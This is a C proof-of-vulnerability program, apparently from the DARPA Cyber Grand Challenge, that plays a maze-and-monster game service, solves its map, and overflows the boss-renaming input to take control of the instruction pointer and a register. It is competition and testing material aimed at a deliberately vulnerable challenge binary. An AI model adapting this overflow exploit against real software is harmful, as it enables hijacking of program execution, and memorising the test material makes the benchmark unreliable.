/*

Author: John Berry <hj@cromulence.com>

Copyright (c) 2015 Cromulence LLC

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in
all copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
THE SOFTWARE.

*/
#include "libcgc.h"
#include "cgc_malloc.h"

#define EAX (0)
#define ECX (1)
#define ESI (6)
#define EBP (5)

typedef struct monster {
	char *type;
	int health;
	cgc_size_t hitpoints;
	cgc_size_t power;
	cgc_size_t experience;
	cgc_size_t level;
} monster, *pmonster;

typedef struct queue {
	int x;
	int y;
	struct queue *next;
	cgc_size_t index;
	char directions[512];
} queue, *pqueue;

typedef struct map {
	int width;
	int height;
	int start_x;
	int start_y;
	int end_x;
	int end_y;

	int current_x;
	int current_y;

	/// Last x where a marker was placed. Used to reverse on failure
	int last_x;

	/// Last y where a marker was placed
	int last_y;

	/// Map data
	char *map_data;
	char *matrix;

	char directions[1024];

	pqueue root;
} map, *pmap;

typedef struct player {
	char name[16];
	cgc_size_t level;
	cgc_size_t mcnt;
	pmonster mons[5];
} player, *pplayer;

char *inout;
cgc_size_t monster_exp;

#define         DEL     0x7f
#define         SPC     0x20

#define         TAB     0x09
#define         LF      0x0a
#define         VT      0x0b
#define         FF      0x0c
#define         CR      0x0d

int cgc_isspace( int c )
{
        if ( c == SPC ||
             c == TAB ||
             c == LF ||
             c == VT ||
             c == FF ||
             c == CR )
                return 1;
        else
                return 0;
}

int cgc_isdigit( int c )
{
        if ( c >= '0' && c <= '9' )
                return 1;
        else
                return 0;
}

int cgc_atoi( const char *pStr )
{
        int value = 0;
        int negative = 0;

        while ( cgc_isspace( *pStr ) )
                pStr++;

        if ( *pStr == '\0' )
                return 0;

        if ( *pStr == '-' )
        {
                negative = 1;
                pStr++;
        }

        // Read in string
        while ( cgc_isdigit( *pStr ) )
                value = (value * 10) + (*pStr++ - '0');

        if ( negative )
                return (-value);
        else
                return value;
}

cgc_size_t cgc_itoa( int value, char *out )
{
	cgc_size_t index = 0;

	if ( value < 0 ) {
		out[index++] = '-';
		value *= -1;
	}

	if ( value >= 10 ) {
		out[index++] = ( value / 10 ) + 0x30;
	}
	out[index++] = ( value % 10) + 0x30;

	return index;
}

cgc_size_t cgc_strlen( const char *str )
{
        cgc_size_t len = 0;
        while ( *str++ != '\0' )
                len++;

        return len;
}

void cgc_bzero( char *buffer, cgc_size_t length)
{
	cgc_size_t index = 0;

	if ( buffer == NULL ) {
		return;
	}

	while ( index < length ) {
		buffer[index] = 0;
		index++;
	}
	return;
}

void cgc_memcpy( char *dst, char*src, cgc_size_t length)
{
	cgc_size_t index = 0;

	if ( dst == NULL || src == NULL ) {
		return;
	}

	while ( index < length ) {
		dst[index] = src[index];
		index++;
	}

	return;
}

char *cgc_strcat(char *restrict s1, const char *restrict s2) {
        unsigned int i,j;

        if (!s1 || !s2) {
                return(NULL);
        }

        for (i = cgc_strlen(s1), j = 0; j < cgc_strlen(s2); i++, j++) {
                s1[i] = s2[j];
        }
        s1[i] = '\0';

        return(s1);
}

unsigned int cgc_ReadBytes(int fd, char *buf, unsigned int len) {
	unsigned int total_bytes = 0;
	cgc_size_t rx_bytes;
	char c;

	while (total_bytes < len) {
		if (cgc_receive(fd, &c, 1, &rx_bytes) != 0) {
			return(0);
		}
		if (rx_bytes == 0) {
			return(0);
		}
		buf[total_bytes++] = c;
	}

	return(total_bytes);
}

unsigned int cgc_ReadUntil(int fd, char delim, char *buf, unsigned int maxlen) {
	unsigned int total_bytes = 0;
	cgc_size_t rx_bytes;
	char c;

	while (total_bytes < maxlen-1) {
		if (cgc_receive(fd, &c, 1, &rx_bytes) != 0) {
			return(0);
		}
		if (rx_bytes == 0) {
			return(0);
		}
		if (c == delim) {
			break;
		}
		buf[total_bytes++] = c;
	}
	buf[total_bytes] = '\0';

	return(total_bytes);
}

unsigned int cgc_SendBytes(int fd, char *buf, unsigned int len) {
	cgc_size_t tx_bytes;
	unsigned int total_bytes = 0;

	while (total_bytes < len) {
		if (cgc_transmit(fd, buf+total_bytes, 1, &tx_bytes) != 0) {
			return(0);
		}
		if (tx_bytes != 1) {
			return(0);
		}
		total_bytes++;
	}

	return(total_bytes);
}

void cgc_NegotiateType1Pov(unsigned int ipmask, unsigned int regmask, unsigned int regnum, unsigned int *type1_ip, unsigned int *type1_reg) {
	unsigned int PovType = 1;

	// Request Type 1 negotitation
	if (cgc_SendBytes(3, (char *)&PovType, 4) != 4) {
		cgc__terminate(-1);
	}

	// Send the ipmask
	if (cgc_SendBytes(3, (char *)&ipmask, 4) != 4) {
		cgc__terminate(-1);
	}

	// Send the regmask
	if (cgc_SendBytes(3, (char *)&regmask, 4) != 4) {
		cgc__terminate(-1);
	}

	// Send the register number we'll be controlling
	if (cgc_SendBytes(3, (char *)&regnum, 4) != 4) {
		cgc__terminate(-1);
	}

	// get the 4-byte value for eip
	if (cgc_ReadBytes(3, (char *)type1_ip, 4) != 4) {
		cgc__terminate(-1);
	}
	// get the 4-byte value for the register
	if (cgc_ReadBytes(3, (char *)type1_reg, 4) != 4) {
		cgc__terminate(-1);
	}

	return;

}

int cgc_addqueue( int x, int y, pmap m, char *dirs )
{
	pqueue pq = NULL;
	cgc_size_t index = 0;
	pqueue walker = NULL;

	/// Check too far left
	if ( x < 0|| m->width <= x ) {
		return 0;
	}

	if ( y < 0 || m->height <= y ) {
		return 0;
	}

	/// Calculate the index
	index = (m->width * y) + x;

	/// If set already then no
	if ( m->matrix[index] == 1 ) {
		return 0;
	}

	m->matrix[index] = 1;

	pq = cgc_malloc( sizeof(queue));

	if ( pq == NULL ) {
		cgc__terminate(-1);
	}

	cgc_bzero((char*)pq, sizeof(queue));

	pq->x = x;
	pq->y = y;
	pq->index = cgc_strlen(dirs);

	cgc_memcpy( pq->directions, dirs, pq->index);

	/// Base case
	if (m->root == NULL ) {
		m->root = pq;
	} else {
		// All others
		walker = m->root;

		while ( walker->next ) {
			walker = walker->next;
		}

		walker->next = pq;
	}

	return 1;
}

pqueue cgc_dequeue( pmap m )
{
	pqueue pq = m->root;

	if ( m->root != NULL ) {
		m->root = m->root->next;
	}

	return pq;

}

int cgc_findpath( pmap m )
{
	pqueue pq = NULL;

	/// Initial queues
	cgc_addqueue( m->start_x, m->start_y-1, m, "u");
	cgc_addqueue( m->start_x+1, m->start_y, m, "r");
	cgc_addqueue( m->start_x, m->start_y+1, m, "d");
	cgc_addqueue( m->start_x-1, m->start_y, m, "l");

	pq = cgc_dequeue( m );

	while ( pq ) {
		if ( pq->x == m->end_x && pq->y == m->end_y) {
			cgc_memcpy( m->directions, pq->directions, cgc_strlen( pq->directions) );
			return 1;
		}

		/// Otherwise add queue
		pq->directions[pq->index] = 'u';
		cgc_addqueue( pq->x, pq->y-1, m, pq->directions);
		pq->directions[pq->index] = 'r';
		cgc_addqueue( pq->x+1, pq->y, m, pq->directions);
		pq->directions[pq->index] = 'd';
		cgc_addqueue( pq->x, pq->y+1, m, pq->directions);
		pq->directions[pq->index] = 'l';
		cgc_addqueue( pq->x-1, pq->y, m, pq->directions);

		cgc_free(pq);

		pq = cgc_dequeue( m );

	}


	return 0;
}

int cgc_fight_monster( )
{
	int success = 0;
	char buffer[1024];
	int index;
	int yodog = 0;

	/// cgc_read the 26 lines
	for ( index = 0; index < 26; index++) {
		cgc_ReadUntil( STDIN, '\n', (char*)buffer, 1024);
	}


	while ( success == 0 && yodog < 10) {
		yodog++;
		/// Read 'Selection: '
		cgc_ReadBytes( STDIN, (char*)buffer, 11 );

		/// Send Attack
		cgc_SendBytes( STDOUT, "1\n", 2 );

		/// Read hit amount
		cgc_ReadUntil( STDIN, '\n', (char*)buffer, 1024);

		monster_exp += 1;

		if ( monster_exp == 15 ) {
			/// Read monster gains a level
			cgc_ReadUntil( STDIN, '\n', (char*)buffer, 1024);

			monster_exp = 0;
		}

		/// Read next line
		cgc_ReadUntil( STDIN, '\n', (char*)buffer, 1024);

		/// Determine if the monster is dead
		if ( buffer[0] == 'Y' && buffer[1] == 'o' && buffer[2] == 'u') {

			cgc_ReadBytes( STDIN, (char*)buffer, 24);


			/// Don't capture monster
			cgc_SendBytes( STDOUT, "n\n", 2 );

			/// Player gains a level.
			cgc_ReadUntil( STDIN, '\n', (char*)buffer, 1024);

			return 0;
		} else {
			for ( index = 0; index < 19; index++) {
			cgc_ReadUntil( STDIN, '\n', (char*)buffer, 1024);
			}
		}
	}

	return 0;
}

void cgc_fight_boss( unsigned int type1_reg, unsigned int type1_ip )
{
	char buffer[1024];
	int index = 0;
	int success = 0;
	unsigned int addr = 0;

	for ( index = 0; index < 28; index++ ) {
		cgc_ReadUntil( STDIN, '\n', (char*)buffer, 1024);
	}


	while ( success == 0 ) {
		/// Read "Selection: "
		cgc_ReadBytes( STDIN, (char*)buffer, 11);

		cgc_SendBytes( STDOUT, "1\n", 2);

		/// Hit for
		cgc_ReadUntil( STDIN, '\n', (char*)buffer, 1024);

		monster_exp += 1;

		if ( monster_exp == 15 ) {
			cgc_ReadUntil( STDIN, '\n', (char*)buffer, 1024);

			monster_exp = 0;
		}

		// hit back or destroyed
		cgc_ReadUntil( STDIN, '\n', (char*)buffer, 1024);

		if ( buffer[0] == 'Y' && buffer[1] == 'o' && buffer[2] == 'u') {
			// Read capture
			cgc_ReadBytes( STDIN, (char*)buffer, 24);

			cgc_SendBytes(STDOUT, "y\n", 2);
			cgc_ReadBytes( STDIN, (char*)buffer, 25);

			/// Yes rename
			cgc_SendBytes(STDOUT, "y\n", 2);
			cgc_ReadBytes( STDIN, (char*)buffer, 10);

			cgc_memcpy( buffer, "aaaabbbbccccddddeeeeffffgggghhhhiiiijjjjkkkkllllmmmmnnnnooooppppqqqqrrrr\n", 73);

			addr = 0xbaaa0000;
			cgc_memcpy( buffer+32, (char*)&addr, 4 );
			cgc_memcpy( buffer+36, (char*)&type1_reg, 4);
			cgc_memcpy( buffer+44, (char*)&type1_ip, 4);

			/// Send bug
			cgc_SendBytes(STDOUT, buffer, 73);

			cgc__terminate(0);
		} else {
			for ( index = 0; index < 19; index++ ) {
				cgc_ReadUntil( STDIN, '\n', (char*)buffer, 1024);
			}
		}

	}

	return;
}

void cgc_getvalues( pmap pm )
{
	char buffer[1024];
	cgc_size_t length = 0;

	cgc_bzero((char*)buffer, 1024);

	/// Read width and height
	cgc_ReadBytes(STDIN, (char*)buffer, 7);

	cgc_bzero( (char*)buffer, 1024);
	cgc_ReadUntil( STDIN, ' ', (char*)buffer, 1024);
	pm->width = cgc_atoi( (const char *)buffer );

	cgc_ReadBytes(STDIN, (char*)buffer, 8);

	cgc_bzero( (char*)buffer, 1024);
	cgc_ReadUntil( STDIN, '\n', (char*)buffer, 1024);
	pm->height = cgc_atoi( (const char *)buffer );

	/// Read startx
	cgc_ReadBytes(STDIN, (char*)buffer, 8);

	cgc_bzero( (char*)buffer, 1024);
	cgc_ReadUntil( STDIN, ' ', (char*)buffer, 1024);
	pm->start_x = cgc_atoi( (const char *)buffer );

	/// Read starty
	cgc_ReadBytes(STDIN, (char*)buffer, 8);

	cgc_bzero( (char*)buffer, 1024);
	cgc_ReadUntil( STDIN, '\n', (char*)buffer, 1024);
	pm->start_y = cgc_atoi( (const char *)buffer );

	/// Read endx
	cgc_ReadBytes(STDIN, (char*)buffer, 6);

	cgc_bzero( (char*)buffer, 1024);
	cgc_ReadUntil( STDIN, ' ', (char*)buffer, 1024);
	pm->end_x = cgc_atoi( (const char *)buffer );

	/// Read endy
	cgc_ReadBytes(STDIN, (char*)buffer, 6);

	cgc_bzero( (char*)buffer, 1024);
	cgc_ReadUntil( STDIN, '\n', (char*)buffer, 1024);
	pm->end_y = cgc_atoi( (const char *)buffer );

	/// Read blank line
	cgc_ReadBytes( STDIN, (char*)buffer, 1);


	length = pm->width * pm->height;

	pm->map_data = cgc_malloc( length );
	pm->matrix = cgc_malloc( length );

	cgc_bzero( (char*)pm->map_data, length );
	cgc_bzero( (char*)pm->matrix, length);

	return;
}

void cgc_setname( void )
{
	char buffer[1024];
	cgc_size_t index = 0;

	cgc_bzero( (char*)buffer, 1024);

	while ( buffer[0] != '|' ) {
		cgc_ReadBytes(STDIN, (char*)buffer, 1);
	}

	cgc_ReadBytes( STDIN, (char*)buffer + cgc_strlen((char*)buffer), 2 );

	cgc_bzero( (char*)buffer, 1024);
	buffer[0] = '\n',
	cgc_SendBytes(STDOUT, (char*)buffer, 1);

	//player Data
	for ( index = 0; index < 15; index++) {
		cgc_bzero( (char*)buffer, 1024);

		cgc_ReadUntil( STDIN, '\n', (char*)buffer, 1024);
	}

	return;
}

void cgc_sendegg( void )
{
	char buffer[1024];

	cgc_bzero( (char*)buffer, 1024);

	cgc_ReadBytes(STDIN, (char*)buffer, 3);

	cgc_bzero( (char*)buffer, 1024);
	buffer[0] = 'e';
	buffer[1] = '\n';

	cgc_SendBytes( STDOUT, (char*)buffer, 2 );
	cgc_ReadUntil( STDIN, '\n', (char*)buffer, 1024);

	cgc_ReadBytes(STDIN, (char*)buffer, 2);
	cgc_SendBytes( STDOUT, "a\n", 2 );
	cgc_ReadUntil( STDIN, '\n', (char*)buffer, 1024);

	cgc_ReadBytes(STDIN, (char*)buffer, 2);
	cgc_SendBytes( STDOUT, "s\n", 2 );
	cgc_ReadUntil( STDIN, '\n', (char*)buffer, 1024);

	cgc_ReadBytes(STDIN, (char*)buffer, 2);
	cgc_SendBytes( STDOUT, "t\n", 2 );
	cgc_ReadUntil( STDIN, '\n', (char*)buffer, 1024);

	cgc_ReadBytes(STDIN, (char*)buffer, 2);
	cgc_SendBytes( STDOUT, "a\n", 2 );
	cgc_ReadUntil( STDIN, '\n', (char*)buffer, 1024);

	cgc_ReadBytes(STDIN, (char*)buffer, 2);
	cgc_SendBytes( STDOUT, " \n", 2 );
	cgc_ReadUntil( STDIN, '\n', (char*)buffer, 1024);

	cgc_ReadBytes(STDIN, (char*)buffer, 2);
	cgc_SendBytes( STDOUT, "e\n", 2 );
	cgc_ReadUntil( STDIN, '\n', (char*)buffer, 1024);


	cgc_ReadBytes(STDIN, (char*)buffer, 2);
	cgc_SendBytes( STDOUT, "g\n", 2 );
	cgc_ReadUntil( STDIN, '\n', (char*)buffer, 1024);

	cgc_ReadBytes(STDIN, (char*)buffer, 2);
	cgc_SendBytes( STDOUT, "g\n", 2 );
	cgc_ReadUntil( STDIN, '\n', (char*)buffer, 1024);

	cgc_ReadUntil( STDIN, '\n', (char*)buffer, 1024);

	return;
}

void cgc_readmap( pmap pm )
{
	char buffer[1024];
	int index = 0;
	int length = 0;

	while ( index < (pm->width * pm->height) ) {

		/// Read a single byte
		length = cgc_ReadBytes( STDIN, (char*)buffer, 1);

		/// Exit on failure
		if ( length == 0 ) {
			cgc__terminate(0);
		}

		/// Skip newlines
		if (buffer[0] == '\n') {
			continue;
		}

		pm->map_data[ index ] = buffer[0];

		if ( buffer[0] == '.' || buffer[0] == 'X') {
			pm->matrix[index] = 0;
		} else {
			pm->matrix[index] = 1;
		}

		index += 1;
	}

	return;
}

int main(int cgc_argc, char *cgc_argv[]) {
	unsigned int type1_ip = 0;
	unsigned int type1_reg = 0;
	player new_player;
	cgc_size_t index = 0;
	cgc_size_t height =0 ;
	cgc_size_t map_index = 0;
	cgc_size_t success = 0;

	map m;
	monster_exp = 0;

	cgc_bzero( (char*)&m, sizeof(map));

	// negotiate a Type1 POV with the Competition Framework
	// we will control eip and ebp
	cgc_NegotiateType1Pov(0xfefefefe, 0xfefefefe, ESI, &type1_ip, &type1_reg);

	type1_ip |= 0x01010101;
	type1_reg |= 0x01010101;

	inout = cgc_malloc( 1024);

	cgc_bzero(inout, 1024);

	cgc_setname();

	cgc_getvalues( &m );

	cgc_readmap( &m );

	cgc_sendegg();

	cgc_findpath( &m );

	/// Loop through all the directions
	index = 0;

	while ( index < cgc_strlen(m.directions) ) {
		cgc_bzero((char*)inout, 1024);
		cgc_ReadBytes( STDIN, (char*)inout, 2);

		switch (inout[0]) {
			case ':':

				inout[0] = m.directions[index];
				inout[1] = '\n';

				cgc_SendBytes( STDOUT, (char*)inout, 2 );
				index++;

				break;
			case '#':
			case '.':
			case 'X':
			case '@':
				/// Read map
				for ( map_index = 0; map_index < m.height; map_index++) {
					cgc_ReadUntil( STDIN, '\n', (char*)inout, 1024);
				}
				break;
			case 'Y':
				/// You are being attacked by a monster
				cgc_fight_monster();
				break;
			case 'r':
				cgc_fight_boss(type1_reg, type1_ip);
				break;
			default:
				cgc__terminate(-10);
				break;
		};
	}

	/// Read the map
	for ( map_index = 0; map_index < m.height; map_index++) {
		cgc_ReadUntil( STDIN, '\n', (char*)inout, 1024);
	}


	/// This should be the boss
	cgc_bzero((char*)inout, 1024);
	cgc_ReadUntil( STDIN, '\n', (char*)inout, 1024);

	if ( inout[0] != 'r' && inout[1] != 'e') {
		cgc__terminate(-14);
	}

	cgc_ReadUntil( STDIN, '\n', (char*)inout, 1024);

	cgc_fight_boss(type1_reg, type1_ip);


	return 0;
}
